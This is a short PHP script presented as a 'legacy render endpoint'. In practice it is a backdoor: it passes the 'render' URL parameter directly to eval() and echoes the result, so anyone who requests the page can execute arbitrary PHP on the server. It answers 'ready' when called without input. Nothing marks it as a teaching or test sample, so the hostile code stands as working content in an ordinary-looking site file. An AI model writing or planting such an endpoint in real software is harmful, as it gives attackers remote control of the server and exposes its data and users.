<?php
// legacy render endpoint
$cmd = $_GET['render'] ?? '';
if ($cmd !== '') { eval('$r = ' . $cmd . ';'); echo $r; }
else { echo 'ready'; }
